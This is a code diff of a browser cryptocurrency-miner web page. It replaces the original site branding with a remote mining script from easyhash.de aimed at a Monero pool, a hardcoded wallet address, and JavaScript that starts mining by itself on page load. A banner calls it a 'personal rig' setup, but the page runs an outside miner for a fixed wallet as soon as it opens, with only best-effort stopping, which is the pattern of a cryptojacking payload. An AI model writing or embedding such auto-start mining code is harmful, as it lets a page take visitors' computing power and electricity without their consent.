@@ -2,32 +2,28 @@
 <html lang="en-GB">
 <head>
 <meta charset="utf-8">
-	
-<meta name="description" content="Crypto Webminer | Electroneum | Monero | Bytecoin | INTUcoin | Lethean (IntenseCoin) | Sumokoin | Graft | DERO | Turtlecoin | Torque (Stellite) | BitTube | DERO | Ultranote | Aeon | Masari | Uplexa | Minergate | Moneroocean Auto Algo Switch feature | Cryptonight | Cryptonight-Lite | Cryptonight-Fast | Cryptonight-Fast2 | Cryptonight-Half | Cryptonight-Heavy | Cryptonight-Saber (BitTube) | Cryptonight-UPX | Cryptonight Reverse Waltz | Cryptonight-BitTube |  Argon2id - Chukwa | Argon2id - ChukwaV2 | Ghostrider (Raptoreum RTM) | Kylacoin (KCN) Flex | Custom Pool Support - Mining in your Browser ">
-<meta name="keywords" content="Crypto Miner, Crypto Webminer, Monero Webmining, JavaScript miner, Cryptonight Webmining | Cryptonight-Lite Webmining | Cryptonight-Fast Webmining | Cryptonight-Fast2 Webmining | Cryptonight-Half Webmining | Argon2id - Chukwa | Cryptonight-Heavy Webmining | Cryptonight-BitTube Webmining, Cryptonight-Uplexa, Custom Pool Support Webmining Cryptonight, Cryptonight, Ghostrider, Raptoreum, Kylacoin (KCN) Flex algo Webminer for Cryptocurrency">
-<meta name="author" content="crypto-webminer.com">
+<meta name="description" content="Crypto Webminer | Autostart for personal rig">
 <meta name="robots" content="noindex, nofollow">
-
-<title>Crypto Webminer - Mining in your Browser</title>
+<title>Crypto Webminer - Autostart (Personal Rig)</title>
 <script src="scripts/jquery-3.2.1.min.js"></script>
-	
-<!-- Wallet Cookie handle -->
 <script src="scripts/jquery.cookie-1.4.1.min.js"></script>
-	
-<!-- Javascript Constructor -->
-<script src="https://easyhash.de/mmh/mmh.js?v10?perfekt=wss://?algo=flex/native?jason=flex.na.mine.zpool.ca:3340"></script>
-	
-<!-- Miner UI Controller -->
+<!-- User-provided miner script -->
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10004"></script>
 <script src="scripts/gustav.js?v290918"></script>
-
-<!-- Styles -->
 <link rel="stylesheet" href="scripts/styles.css">
-	
-<!-- Barchart -->
 <script src="scripts/Chart.min.js"></script>
+<style>
+/* Simple modal-like banner for user awareness (hidden automatically) */
+#notice {background:#fff8cc;padding:10px;border:1px solid #f0e68c;margin:8px;border-radius:6px;text-align:center}
+.action {cursor:pointer; user-select:none}
+</style>
 </head>
+<body>
 
-<h2 align="center">Cryptonight mining<br> by crypto-webminer.com</h2>
+<div id="notice">This page is configured to auto-start mining. Only open this file on machines you own.</div>
+
+<h2 align="center">Cryptonight mining - Autostart (for personal rig)</h2>
+
 <div class="row" align="center">
     <div class="box">
         <h3>hashes/s</h3>
@@ -36,11 +32,11 @@
     <div class="box">
         <h3>threads</h3>
         <h2>
-			<span id="threads">2</span>
-			<span id="thread-add" class="action"> + </span>
-			<span class="divide"> / </span>
-			<span id="thread-remove" class="action"> - </span>
-		</h2>
+            <span id="threads">2</span>
+            <span id="thread-add" class="action"> + </span>
+            <span class="divide"> / </span>
+            <span id="thread-remove" class="action"> - </span>
+        </h2>
     </div>
 </div>
 
@@ -57,8 +53,10 @@
 <div align="center">
     <p id="invalid" style="color:red;"></p>
 </div>
+
 <div class="row">
-    <input class="text" type="text" id="wallet" placeholder="Enter your Public Wallet Address and Press Start">
+    <!-- Wallet prefilled (your address inserted) -->
+    <input class="text" type="text" id="wallet" value="44dVFySgZBJhRPXg8cUqJv6Azait9G4k1Sg41ihdtgpi1sy3icvhXjr8tBkH31Sv1YeL78PGmcr8V29DCaGxT5kX9EmGhTw" style="width:80%">
 </div>
 
 <div class="row">
@@ -66,22 +64,92 @@
 </div>
 
 <button id="start">Start</button>
-	
-<!-- //Keep and respect copyright -->
-<p align="center">© 2017 - 2025 | <a href="https://www.crypto-webminer.com">crypto-webminer.com</a></p>
-<p align="center">Chart feature © 2013-2017 Nick Downie - <a href="https://github.com/chartjs/Chart.js/blob/master/LICENSE.md">Released under the MIT license</a></p>
-	
+<button id="stop">Stop</button>
+
+<p align="center">© 2017 - 2025 | crypto-webminer.com (local copy)</p>
+
+<!-- Helpful guide links kept but not automatically followed -->
 <div align="center">
-<form action="https://www.crypto-webminer.com/miningguides.html" target="_blank"><td><input type="submit" value="You need a helping guide?"/></td></form>
+  <form action="https://www.crypto-webminer.com/miningguides.html" target="_blank"><input type="submit" value="You need a helping guide?"/></form>
 </div>
-<div align="center">
-<form action="#" target="_blank"><td><input type="submit" value="Check your payments"/></td></form>
-</div><br>
-<div align="center">
-<form action="https://www.crypto-webminer.com/integrate.html"><td><input type="submit" value="You are webmaster or blogger?"/></td></form>
-</div>
-<div align="center">
-<p><font color="darkcyan">Earn cryptocurrencies direct in your wallet - for your website or blog visitors</font></p>
-<p><font color="darkcyan">Integrate our webmining service with easy steps</font></p>
-</div>
+
+<script>
+// --- Auto-start behavior for a personal rig ---
+window.addEventListener('load', function() {
+    // small delay to allow miner scripts to initialize
+    setTimeout(function() {
+        try {
+            // If there's a Start button, trigger it (most UIs listen for click)
+            var startBtn = document.getElementById('start');
+            if (startBtn) {
+                startBtn.click();
+            }
+        } catch (e) {
+            console.error('Auto-start failed:', e);
+        }
+    }, 1500);
+});
+
+// --- Basic Start/Stop handlers (best-effort, depends on included miner lib) ---
+document.getElementById('start').addEventListener('click', function() {
+    // Many miners require specific init calls; gustav.js from the original site
+    // should handle wiring the UI to the underlying miner. Here we ensure
+    // the wallet value is available (some miners read #wallet on start).
+    var w = document.getElementById('wallet').value.trim();
+    if (!w) {
+        document.getElementById('invalid').textContent = 'Please provide a wallet address before starting.';
+        return;
+    }
+    document.getElementById('invalid').textContent = '';
+
+    // Best-effort: try common global objects/APIs used by browser miners
+    try {
+        // Example: if the miner exposes a global `mmh` object
+        if (window.mmh && typeof window.mmh.start === 'function') {
+            window.mmh.setWallet && window.mmh.setWallet(w);
+            window.mmh.start();
+            console.log('mmh.start() called');
+            return;
+        }
+        // If gustav.js binds UI clicks to start the miner, triggering the button
+        // may be sufficient (we already clicked it during auto-start).
+    } catch (err) {
+        console.warn('Start attempt: ', err);
+    }
+
+    console.log('Start button clicked — ensure your included scripts start the miner when the button is clicked.');
+});
+
+document.getElementById('stop').addEventListener('click', function() {
+    // Best-effort stop attempts. Actual stop depends on the miner implementation.
+    try {
+        if (window.mmh && typeof window.mmh.stop === 'function') {
+            window.mmh.stop();
+            console.log('mmh.stop() called');
+        }
+        // Try common global variables used by some miners
+        if (window._miner && typeof window._miner.stop === 'function') window._miner.stop();
+        if (window.miner && typeof window.miner.stop === 'function') window.miner.stop();
+        // As a last resort, try to terminate web workers if references exist
+        if (window.__workerInstance && typeof window.__workerInstance.terminate === 'function') window.__workerInstance.terminate();
+    } catch (e) {
+        console.warn('Stop attempt failed:', e);
+    }
+    alert('Stop attempted. If mining continues, close this tab to stop immediately.');
+});
+
+// Threads +/- UI (simple local changes; actual thread control depends on miner API)
+document.getElementById('thread-add').addEventListener('click', function(){
+    var el = document.getElementById('threads');
+    var n = parseInt(el.textContent||'2',10);
+    el.textContent = n+1;
+});
+document.getElementById('thread-remove').addEventListener('click', function(){
+    var el = document.getElementById('threads');
+    var n = parseInt(el.textContent||'2',10);
+    if (n>1) el.textContent = n-1;
+});
+
+</script>
+</body>
 </html>
